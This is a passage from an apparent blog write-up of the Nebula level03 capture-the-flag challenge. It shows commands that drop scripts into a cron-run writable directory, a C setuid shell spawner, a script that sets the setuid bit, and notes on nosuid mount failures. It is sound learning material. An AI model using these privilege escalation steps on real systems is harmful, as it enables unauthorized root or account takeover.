level03@nebula:/home/flag03$ cat &amp;gt; writable.d/flag &lt;span class="s"&gt;&amp;lt;&amp;lt; EOF&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; #!/usr/bin/env bash&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; getflag &amp;gt; /tmp/flag.result&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; EOF&lt;/span&gt;
level03@nebula:/home/flag03$ cat /tmp/flag.result
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Solution2&lt;/h4&gt;
&lt;p&gt;Prepare simple C program to gain bash access&lt;/p&gt;
&lt;h4&gt;Result2&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;gid_t&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uid_t&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;gid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getegid&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="n"&gt;uid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;geteuid&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

  &lt;span class="n"&gt;setresgid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;setresuid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level03@nebula:/tmp$ cat &amp;gt; /home/flag03/writable.d/exploit.sh &lt;span class="s"&gt;&amp;lt;&amp;lt; EOF&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; #!/usr/bin/env bash&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; cp /tmp/exploit /home/flag03/exploitable&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; chmod u+s /home/flag03/exploitable&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; EOF&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Mistakes&lt;/h4&gt;
&lt;h5&gt;First&lt;/h5&gt;
&lt;p&gt;I tried to create copy of &lt;code&gt;exploit&lt;/code&gt; program in &lt;code&gt;/tmp&lt;/code&gt; directory. However, when I tried to run it, it didn't give me &lt;code&gt;flag03&lt;/code&gt; user. After looking into &lt;code&gt;/etc/fstab&lt;/code&gt; it became obvious:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;flag03@nebula:/home/flag03$ cat /etc/fstab&lt;/span&gt;
&lt;span class="err"&gt;overlayfs / overlayfs rw 0 0&lt;/span&gt;
&lt;span class="err"&gt;tmpfs /tmp tmpfs nosuid,nodev 0 0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;tmpfs&lt;/code&gt; has &lt;code&gt;nosuid&lt;/code&gt; option. It means, that the nosuid mount option specifies that the filesystem cannot contain set userid files.&lt;/p&gt;
&lt;h5&gt;Second&lt;/h5&gt;
&lt;p&gt;When I found that &lt;code&gt;nosetuid&lt;/code&gt; is preventing from running program from within &lt;code&gt;/tmp&lt;/code&gt;, I decided to copy &lt;code&gt;exploit&lt;/code&gt; to &lt;code&gt;/home/level03&lt;/code&gt;. It failed, because default user running &lt;code&gt;writable.sh&lt;/code&gt; wasn't &lt;code&gt;root&lt;/code&gt; but &lt;code&gt;flag03&lt;/code&gt;. Solution was to copy payload to &lt;code&gt;/home/flag03&lt;/code&gt; directory.&lt;/p&gt;</content><category term="Learning"></category><category term="ctf"></category><category term="exploit"></category><category term="nebula"></category></entry></feed>